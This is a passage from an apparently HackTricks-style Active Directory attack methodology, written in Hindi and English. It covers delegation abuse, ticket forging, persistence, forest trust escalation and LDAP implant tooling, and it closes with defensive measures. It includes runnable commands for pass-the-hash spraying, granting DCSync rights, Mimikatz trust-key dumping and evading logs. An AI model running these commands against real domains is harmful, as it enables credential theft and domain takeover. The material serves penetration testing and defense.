इस attack का उद्देश्य **user के NTLM hash का उपयोग करके Kerberos tickets request करना** है, जो common Pass The Hash over NTLM protocol का एक alternative है। इसलिए, यह उन networks में विशेष रूप से **useful हो सकता है जहां NTLM protocol disabled है** और authentication protocol के रूप में केवल **Kerberos allowed है**।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** method में attackers अपने password या hash values के बजाय **user का authentication ticket steal** करते हैं। इस stolen ticket का उपयोग फिर **user को impersonate** करने और network के अंदर resources और services तक unauthorized access प्राप्त करने के लिए किया जाता है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी **local administrato**r का **hash** या **password** है, तो आपको उसके साथ अन्य **PCs पर locally login** करने का प्रयास करना चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **noisy** है और **LAPS** इसे **mitigate** कर सकता है।

### MSSQL Abuse & Trusted Links

यदि किसी user के पास **MSSQL instances** को **access** करने के privileges हैं, तो वह इसका उपयोग MSSQL host में **commands execute** करने (यदि वह SA के रूप में चल रहा हो), NetNTLM **hash** को **steal** करने या यहां तक कि **relay** **attack** करने के लिए कर सकता है।\
यदि कोई MSSQL instance किसी अन्य instance द्वारा database link के माध्यम से trusted है, तो linked database पर privileges रखने वाला user **trust relationship का उपयोग करके दूसरे instance पर queries execute** कर सकता है। इन trusts को chain किया जा सकता है और अंततः किसी misconfigured database तक पहुंचा जा सकता है, जहां user commands execute कर सकता है।\
**Databases के बीच links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुंचने के लिए powerful paths expose करते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आपको [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute वाला कोई Computer object मिलता है और आपके पास उस computer में domain privileges हैं, तो आप computer पर login करने वाले हर user के TGTs को memory से dump कर सकेंगे।\
इसलिए, यदि कोई **Domain Admin computer पर login करता है**, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसका impersonate कर सकेंगे।\
Constrained delegation की सहायता से आप एक **Print Server को automatically compromise** भी कर सकते हैं (उम्मीद है कि वह DC होगा)।


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" के लिए allow किया गया है, तो वह **किसी computer में services को access करने के लिए किसी भी user का impersonate** कर सकेगा।\
फिर, यदि आप इस user/computer का **hash compromise** कर लेते हैं, तो आप **किसी भी user** (यहां तक कि domain admins) का **impersonate** करके कुछ services को access कर सकेंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त किया जा सकता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर **interesting privileges** हो सकते हैं, जो आपको बाद में lateral **move** करने/**privileges escalate** करने की अनुमति दे सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के भीतर **Spool service listening** का पता चलने पर इसका **abuse** करके **नई credentials प्राप्त** की जा सकती हैं और **privileges escalate** किए जा सकते हैं।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **अन्य users** **compromised** machine को **access** करते हैं, तो **memory से credentials gather** करना और यहां तक कि उन्हें impersonate करने के लिए उनके processes में **beacons inject** करना संभव है।\
आमतौर पर users RDP के माध्यम से system को access करेंगे, इसलिए यहां third party RDP sessions पर कुछ attacks करने का तरीका दिया गया है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने की system प्रदान करता है, यह सुनिश्चित करते हुए कि वह **randomized**, unique और बार-बार **changed** हो। ये passwords Active Directory में store होते हैं और access को केवल authorized users के लिए ACLs के माध्यम से control किया जाता है। इन passwords को access करने के लिए पर्याप्त permissions होने पर अन्य computers पर pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised machine से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं, तो privileges escalate करने के लिए उनका abuse करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार **Domain Admin** या इससे भी बेहतर **Enterprise Admin** privileges प्राप्त हो जाने पर, आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[DCSync attack के बारे में **अधिक जानकारी यहां मिल सकती है**](dcsync.md)।

[NTDS.dit को steal करने के तरीके के बारे में **अधिक जानकारी यहां मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले discuss की गई कुछ techniques का उपयोग persistence के लिए किया जा सकता है।\
उदाहरण के लिए आप:

- Users को [**Kerberoast**](kerberoast.md) के लिए vulnerable बना सकते हैं

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users को [**ASREPRoast**](asreproast.md) के लिए vulnerable बना सकते हैं

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges grant कर सकते हैं

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** किसी specific service के लिए **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके एक **legitimate Ticket Granting Service (TGS) ticket** create करता है। इस method का उपयोग **service privileges access** करने के लिए किया जाता है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

एक **Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account का NTLM hash** प्राप्त करता है। यह account विशेष है क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए किया जाता है, जो AD network के भीतर authentication के लिए आवश्यक होते हैं।

एक बार attacker यह hash प्राप्त कर लेता है, तो वह अपनी पसंद के किसी भी account के लिए **TGTs** create कर सकता है (Silver ticket attack)।


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, लेकिन इस तरह forge किए जाते हैं कि **common golden tickets detection mechanisms को bypass** कर सकें।


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates होना या उन्हें request कर सकना** user के account में persist करने का एक बहुत अच्छा तरीका है (भले ही वह password बदल दे):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग करके domain के भीतर high privileges के साथ persist करना भी संभव है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object इन groups पर एक standard **Access Control List (ACL)** लागू करके **privileged groups** (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करता है, ताकि unauthorized changes को रोका जा सके। हालांकि, इस feature का exploitation किया जा सकता है; यदि कोई attacker AdminSDHolder के ACL को modify करके किसी regular user को full access दे देता है, तो उस user को सभी privileged groups पर व्यापक control मिल जाता है। सुरक्षा के लिए बनाया गया यह measure, closely monitored न होने पर, उल्टा unwarranted access की अनुमति दे सकता है।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहां है।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी machine पर admin rights प्राप्त करके local Administrator hash को **mimikatz** का उपयोग करके extract किया जा सकता है। इसके बाद, इस password के **use को enable** करने के लिए registry modification आवश्यक है, जिससे local Administrator account को remotely access किया जा सके।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी **user** को कुछ specific domain objects पर **special permissions दे** सकते हैं, जिससे user **भविष्य में privileges escalate** कर सके।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग उन **permissions को store** करने के लिए किया जाता है जो किसी **object के पास दूसरे object पर** होती हैं। यदि आप किसी object के **security descriptor में छोटा सा change** कर सकते हैं, तो privileged group का member बने बिना उस object पर बहुत interesting privileges प्राप्त कर सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का abuse करके `entryTTL`/`msDS-Entry-Time-To-Die` के साथ short-lived principals/GPOs/DNS records create करें; ये tombstones के बिना self-delete हो जाते हैं, LDAP evidence मिटाते हुए orphan SIDs, broken `gPLink` references या cached DNS responses छोड़ जाते हैं (जैसे AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects)।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

सभी domain accounts को access प्रदान करने वाला **universal password** establish करने के लिए memory में **LSASS** को alter करें।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) क्या है, यहां जानें।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Machine को access करने के लिए उपयोग की जाने वाली **credentials को clear text में capture** करने के लिए आप अपना **own SSP** create कर सकते हैं।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **new Domain Controller** register करता है और specified objects पर **attributes** (SIDHistory, SPNs...) **push** करने के लिए इसका उपयोग करता है, तथा **modifications** से संबंधित कोई **logs** नहीं छोड़ता। आपके पास **DA** privileges होना और **root domain** के अंदर होना आवश्यक है।\
ध्यान दें कि यदि आप गलत data का उपयोग करते हैं, तो काफी खराब logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords read करने के लिए पर्याप्त permission** हो, तो privileges कैसे escalate किए जा सकते हैं। हालांकि, इन passwords का उपयोग **persistence maintain** करने के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका अर्थ है कि **एक domain को compromise करने से potentially पूरा Forest compromise हो सकता है**।<sup>[[1]](#references)</sup>

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है, जो एक **domain** के user को दूसरे **domain** में resources access करने में सक्षम बनाता है। यह मूल रूप से दोनों domains के authentication systems के बीच linkage create करता है, जिससे authentication verifications सहज रूप से flow कर सकें। जब domains trust set up करते हैं, तो वे अपने **Domain Controllers (DCs)** के भीतर specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए महत्वपूर्ण होती हैं।

एक typical scenario में, यदि कोई user किसी **trusted domain** में service access करना चाहता है, तो उसे पहले अपने domain के DC से एक special ticket, जिसे **inter-realm TGT** कहा जाता है, request करना होता है। यह TGT shared **key** से encrypted होता है, जिस पर दोनों domains सहमत होते हैं। इसके बाद user इस TGT को **trusted domain के DC** के सामने प्रस्तुत करके service ticket (**TGS**) प्राप्त करता है। Trusted domain के DC द्वारा inter-realm TGT के successful validation के बाद, वह एक TGS issue करता है, जिससे user को service access मिलता है।

**Steps**:

1. **Domain 1** का एक **client computer** अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करके process शुरू करता है।
2. यदि client successfully authenticated है, तो DC1 एक नया TGT issue करता है।
3. इसके बाद client DC1 से एक **inter-realm TGT** request करता है, जो **Domain 2** में resources access करने के लिए आवश्यक है।
4. Inter-realm TGT को DC1 और DC2 के बीच shared **trust key** से encrypted किया जाता है, जो two-way domain trust का हिस्सा है।
5. Client inter-realm TGT को **Domain 2 के Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपनी shared trust key का उपयोग करके inter-realm TGT verify करता है और valid होने पर, उस server के लिए **Ticket Granting Service (TGS)** issue करता है जिसे client Domain 2 में access करना चाहता है।
7. अंत में, client इस TGS को server के सामने प्रस्तुत करता है। यह server के account hash से encrypted होता है और Domain 2 में service access प्रदान करता है।

### Different trusts

यह ध्यान देना महत्वपूर्ण है कि **trust 1-way या 2-way हो सकता है**। 2-way option में दोनों domains एक-दूसरे पर trust करेंगे, लेकिन **1-way** trust relation में एक domain **trusted** और दूसरा **trusting** domain होगा। बाद वाले case में, **आप केवल trusted domain से trusting domain के अंदर resources access कर सकेंगे**।

यदि Domain A, Domain B पर trust करता है, तो A trusting domain और B trusted domain है। इसके अलावा, **Domain A** में यह **Outbound trust** होगा; और **Domain B** में यह **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह उसी forest के भीतर एक common setup है, जहां child domain automatically अपने parent domain के साथ two-way transitive trust रखता है। इसका मूल अर्थ है कि authentication requests parent और child के बीच सहज रूप से flow कर सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" कहा जाता है और referral processes को तेज करने के लिए child domains के बीच establish किया जाता है। Complex forests में authentication referrals को आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। Cross-links create करने से यह journey छोटी हो जाती है, जो geographically dispersed environments में विशेष रूप से लाभदायक है।
- **External Trusts**: ये अलग और unrelated domains के बीच set up किए जाते हैं और nature से non-transitive होते हैं। [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts ऐसे domain में resources access करने के लिए उपयोगी हैं जो current forest के बाहर हो और forest trust से connected न हो। External trusts के साथ SID filtering द्वारा security मजबूत की जाती है।
- **Tree-root Trusts**: ये forest root domain और newly added tree root के बीच automatically establish होते हैं। हालांकि इनका सामना आमतौर पर नहीं होता, tree-root trusts forest में new domain trees जोड़ने के लिए महत्वपूर्ण हैं, जिससे वे unique domain name बनाए रख सकें और two-way transitivity सुनिश्चित हो। अधिक जानकारी [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह दो forest root domains के बीच two-way transitive trust होता है, जिसमें security measures को बेहतर बनाने के लिए SID filtering भी लागू होती है।
- **MIT Trusts**: ये non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ establish किए जाते हैं। MIT trusts कुछ अधिक specialized होते हैं और Windows ecosystem के बाहर Kerberos-based systems के साथ integration आवश्यक होने वाले environments के लिए बनाए जाते हैं।

#### Other differences in **trusting relationships**

- Trust relationship **transitive** (A trusts B, B trusts C, तो A trusts C) या **non-transitive** भी हो सकता है।
- Trust relationship को **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (केवल उनमें से एक दूसरे पर trust करता है) के रूप में set up किया जा सकता है।

### Attack Path

1. **Trusting relationships enumerate** करें
2. Check करें कि क्या कोई **security principal** (user/group/computer) **दूसरे domain के resources को access** कर सकता है, संभवतः ACE entries के माध्यम से या दूसरे domain के groups में member होने के कारण। **Domains के बीच relationships** खोजें (संभवतः इसी कारण trust create किया गया था)।
1. इस case में kerberoast एक अन्य option हो सकता है।
3. उन **accounts को compromise** करें जो domains के बीच **pivot** कर सकते हैं।

Attackers तीन primary mechanisms के माध्यम से किसी अन्य domain में resources access कर सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups, जैसे server के “Administrators” group में add किया जा सकता है, जिससे उन्हें उस machine पर significant control मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के members भी हो सकते हैं। हालांकि, इस method की effectiveness trust की nature और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL** में, विशेष रूप से **DACL** के भीतर **ACEs** में entities के रूप में specify किया जा सकता है, जिससे उन्हें specific resources का access मिलता है। जो लोग ACLs, DACLs और ACEs की mechanics को गहराई से समझना चाहते हैं, उनके लिए “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” शीर्षक वाला whitepaper एक invaluable resource है।<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain में foreign security principals खोजने के लिए आप **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** check कर सकते हैं। ये **external domain/forest** के user/group होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके check कर सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> यहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरी _Parent_ --> _Child_ के लिए।\
> आप वर्तमान domain द्वारा उपयोग की जाने वाली key को इससे प्राप्त कर सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection का दुरुपयोग करके child/parent domain में Enterprise admin के रूप में privilege escalation करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Writeable Configuration NC का Exploit करें

यह समझना महत्वपूर्ण है कि Configuration Naming Context (NC) का exploit कैसे किया जा सकता है। Configuration NC, Active Directory (AD) environments में पूरे forest के configuration data के लिए एक central repository के रूप में कार्य करता है। यह data forest के प्रत्येक Domain Controller (DC) को replicate किया जाता है, जबकि writable DCs Configuration NC की एक writable copy बनाए रखते हैं। इसका exploit करने के लिए किसी के पास **DC पर SYSTEM privileges** होना आवश्यक है, और child DC को प्राथमिकता दी जाती है।

**GPO को root DC site से link करें**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined computers की sites से संबंधित जानकारी होती है। किसी भी DC पर SYSTEM privileges के साथ कार्य करके attackers GPOs को root DC sites से link कर सकते हैं। यह action इन sites पर लागू policies में बदलाव करके root domain को potentially compromise कर सकता है।

गहन जानकारी के लिए [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) पर research देखी जा सकती है।<sup>[[12]](#references)</sup>

**Forest में किसी भी gMSA को compromise करें**

एक attack vector में domain के भीतर privileged gMSAs को target करना शामिल है। KDS Root key, जो gMSAs के passwords की गणना के लिए आवश्यक है, Configuration NC में stored होती है। किसी भी DC पर SYSTEM privileges के साथ KDS Root key को access करना और पूरे forest में किसी भी gMSA के passwords compute करना संभव है।

विस्तृत analysis और step-by-step guidance यहाँ मिल सकती है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – migration attributes का abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)।<sup>[[13]](#references)</sup>

**Schema change attack**

इस method में patience की आवश्यकता होती है और नए privileged AD objects के creation की प्रतीक्षा करनी पड़ती है। SYSTEM privileges के साथ attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control दे सकता है। इससे नए बनाए गए AD objects पर unauthorized access और control प्राप्त हो सकता है।

आगे का अध्ययन [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) पर उपलब्ध है।<sup>[[14]](#references)</sup>

**DA से EA तक ADCS ESC5 के साथ**

ADCS ESC5 vulnerability Public Key Infrastructure (PKI) objects पर control को target करती है, ताकि ऐसा certificate template बनाया जा सके जो forest के भीतर किसी भी user के रूप में authentication सक्षम करे। चूँकि PKI objects Configuration NC में रहते हैं, writable child DC को compromise करने से ESC5 attacks को execute करना संभव हो जाता है।

अधिक details [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) में पढ़ी जा सकती हैं।<sup>[[15]](#references)</sup> ADCS न होने वाले scenarios में attacker आवश्यक components set up कर सकता है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में बताया गया है।<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) या bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस scenario में **आपका domain** किसी external domain द्वारा **trusted** है, जो आपको उस पर **undetermined permissions** देता है। आपको यह पता लगाना होगा कि **आपके domain के कौन-से principals को external domain पर कौन-सा access प्राप्त है**, और फिर उसका exploit करने का प्रयास करना होगा:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस scenario में **your domain** किसी **different domains** के principal को कुछ **privileges** सौंप रहा है।

हालांकि, जब **domain is trusted** by the trusting domain, trusted domain एक **predictable name** वाला **user** बनाता है, जिसका **password the trusted password** होता है। इसका अर्थ है कि **trusting domain** के किसी **user** तक पहुंच प्राप्त करके **trusted one** में प्रवेश करना, उसका enumeration करना और अधिक **privileges** escalate करने का प्रयास करना संभव है:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain को compromise करने का एक और तरीका है domain trust की **opposite direction** में बनाया गया [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ढूंढना, जो बहुत सामान्य नहीं है।

Trusted domain को compromise करने का एक और तरीका ऐसी machine पर प्रतीक्षा करना है, जहां **trusted domain** का **user** **RDP** के माध्यम से login कर सके। इसके बाद attacker RDP session process में code inject करके वहां से victim के **origin domain** तक पहुंच सकता है।\
इसके अलावा, यदि **victim mounted his hard drive**, तो attacker **RDP session** process से **hard drive** के **startup folder** में **backdoors** store कर सकता है। इस technique को **RDPInception** कहा जाता है।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trusts में SID history attribute का उपयोग करने वाले attacks का risk SID Filtering से कम किया जाता है, जो सभी inter-forest trusts पर default रूप से activated होता है। यह इस assumption पर आधारित है कि intra-forest trusts secure हैं, क्योंकि Microsoft के अनुसार security boundary के रूप में domain के बजाय forest को माना जाता है।
- हालांकि, एक समस्या है: SID filtering applications और user access को बाधित कर सकता है, जिसके कारण इसे कभी-कभी deactivate कर दिया जाता है।

### **Selective Authentication:**

- Inter-forest trusts के लिए Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users automatically authenticated न हों। इसके बजाय, users को trusting domain या forest के भीतर domains और servers तक access के लिए explicit permissions की आवश्यकता होती है।
- यह ध्यान रखना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के exploitation या trust account पर किए गए attacks से सुरक्षा नहीं देते।

[**ired.team में domain trusts के बारे में अधिक information।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants से LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implement करता है, जो पूरी तरह on-host implant (जैसे Adaptix C2) के अंदर run होते हैं। Operators `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से pack compile करते हैं, `ldap.axs` load करते हैं, और फिर beacon से `ldap <subcommand>` call करते हैं। सभी traffic current logon security context का उपयोग करके LDAP (389) पर signing/sealing के साथ या LDAPS (636) पर auto certificate trust के साथ चलता है, इसलिए socks proxies या disk artifacts की आवश्यकता नहीं होती।<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (security descriptors सहित) तथा `rootDSE` से forest/domain metadata प्राप्त करते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` roasting candidates, delegation settings, और LDAP से सीधे मौजूदा [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors दिखाते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance की सूची बनाते हैं, जिससे ACL privilege escalation के लिए तत्काल targets मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### escalation और persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operator को उन सभी स्थानों पर नए principals या machine accounts तैयार करने देते हैं जहाँ OU rights मौजूद हों। Write-property rights मिलने के बाद `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute सीधे targets पर कब्ज़ा कर लेते हैं।
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` जैसे ACL-केंद्रित commands किसी भी AD object पर मौजूद WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं और PowerShell/ADSI artifacts नहीं छोड़ते। `remove-*` counterparts injected ACEs को साफ़ कर देते हैं।

### Delegation, roasting, और Kerberos abuse

- `add-spn`/`set-spn` compromised user को तुरंत Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए चिह्नित करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को rewrite करते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की आवश्यकता समाप्त हो जाती है।

### sidHistory injection, OU relocation, और attack surface shaping

- `add-sidhistory` controlled principal के SID history में privileged SIDs inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के माध्यम से पूरी तरह stealthy access inheritance मिलता है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को उन OUs में ले जा सकता है जहाँ delegated rights पहले से मौजूद हैं और फिर `set-password`, `add-groupmember`, या `add-spn` का abuse कर सकता है।
- सीमित scope वाले removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) operator द्वारा credentials या persistence हासिल करने के बाद तेज़ rollback की अनुमति देते हैं और telemetry को न्यूनतम रखते हैं।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**credentials को सुरक्षित रखने के बारे में यहाँ अधिक जानें।**](../stealing-credentials/credentials-protections.md)

### **Credential Protection के लिए Defensive Measures**

- **Domain Admins Restrictions**: यह recommended है कि Domain Admins को केवल Domain Controllers पर login करने की अनुमति हो और अन्य hosts पर उनके उपयोग से बचा जाए।
- **Service Account Privileges**: security बनाए रखने के लिए Services को Domain Admin (DA) privileges के साथ run नहीं किया जाना चाहिए।
- **Temporal Privilege Limitation**: DA privileges की आवश्यकता वाले tasks के लिए उनकी अवधि सीमित होनी चाहिए। इसे इस प्रकार हासिल किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 को audit करें और फिर DCs/clients पर LDAP signing तथा LDAPS channel binding लागू करें, ताकि LDAP MITM/relay attempts को block किया जा सके।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

